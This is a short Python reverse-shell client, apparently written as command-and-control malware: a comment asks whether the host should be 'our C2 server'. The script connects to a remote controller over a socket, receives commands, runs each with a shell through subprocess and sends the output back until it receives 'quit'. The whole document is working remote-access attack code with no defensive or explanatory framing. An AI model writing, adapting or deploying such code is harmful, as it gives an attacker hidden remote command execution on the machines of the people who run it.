#! /usr/bin/env python3

import socket
import subprocess

HOST = '0.0.0.0' # does this need to be our C2 server?
PORT = 5555 # random port it does not matter

# set up the socket and connect to the server
s = socket.socket()
s.connect((HOST, PORT))

# get the welcome message
#msg = s.recv(1024).decode()
#print('[*] server:', msg)


# this loop will run until it receive 'quit'
while True:

    # receive the command and print it
    cmd = s.recv(1024).decode()
    #print(f'[*] receive {cmd}')

    # check if you want to quit
    if cmd.lower() == 'quit':
        break

    # now run the command and get the result.
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    # if the command has no output, send 'ok' so the server knows everything is okay
    if len(result) == 0:
        result = 'OK'.encode()

    # send the result to the server
    s.send(result)

s.close()
